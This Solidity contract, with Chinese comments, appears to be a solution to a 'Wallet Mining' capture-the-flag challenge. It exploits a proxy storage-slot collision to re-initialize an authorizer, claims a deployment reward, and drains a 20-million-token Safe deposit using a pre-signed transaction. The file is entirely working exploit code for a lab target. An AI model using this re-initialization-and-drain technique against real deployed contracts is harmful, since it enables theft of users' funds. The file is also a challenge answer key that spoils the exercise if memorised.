// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Safe, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {AuthorizerUpgradeable} from "../../src/wallet-mining/AuthorizerUpgradeable.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";

/**
 * @notice 漏洞利用合约
 * 核心漏洞：TransparentProxy 中 `upgrader`（slot 0）与 AuthorizerUpgradeable
 * 中 `needsInit`（slot 0）产生 storage 碰撞。
 * setUpgrader 调用后 slot 0 = 非零 upgrader 地址，
 * 导致 init() 的 `require(needsInit != 0)` 可再次通过，
 * 任何人均可重新初始化 authorizer 将自己加入授权列表。
 */
contract WalletMiningAttacker {
    uint256 private constant DEPOSIT_AMOUNT = 20_000_000e18;
    address private constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;

    constructor(
        address authorizer,
        address walletDeployer,
        address token,
        address ward,
        address user,
        bytes memory safeInitData,
        uint256 saltNonce,
        bytes memory userSig
    ) {
        // 步骤1：利用 storage slot 碰撞重新初始化 authorizer
        // needsInit (slot 0) == upgrader address != 0，因此 require 通过
        _reinitAuthorizer(authorizer);

        // 步骤2：调用 drop 部署 Safe 到 USER_DEPOSIT_ADDRESS，获取 1 DVT 奖励
        WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, safeInitData, saltNonce);

        // 步骤3：将 1 DVT 奖励转给 ward
        _sendRewardToWard(token, ward);

        // 步骤4：执行 Safe 多签交易（用 user 私钥预签名），将 20M DVT 转给 user
        _drainDeposit(token, user, userSig);
    }

    function _reinitAuthorizer(address authorizer) private {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerUpgradeable(authorizer).init(wards, aims);
    }

    function _sendRewardToWard(address token, address ward) private {
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(ward, bal);
    }

    function _drainDeposit(address token, address user, bytes memory userSig) private {
        // 使用 call + selector，避免高阶 execTransaction 在 via-ir 下触发 Yul 栈交换错误
        bytes memory inner = abi.encodeWithSelector(IERC20.transfer.selector, user, DEPOSIT_AMOUNT);
        bytes memory data = abi.encodeWithSelector(
            Safe.execTransaction.selector,
            token,
            uint256(0),
            inner,
            uint8(Enum.Operation.Call),
            uint256(0),
            uint256(0),
            uint256(0),
            address(0),
            address(0),
            userSig
        );
        (bool ok, bytes memory ret) = payable(USER_DEPOSIT_ADDRESS).call(data);
        require(ok && ret.length >= 32 && abi.decode(ret, (bool)), "execTransaction failed");
    }
}
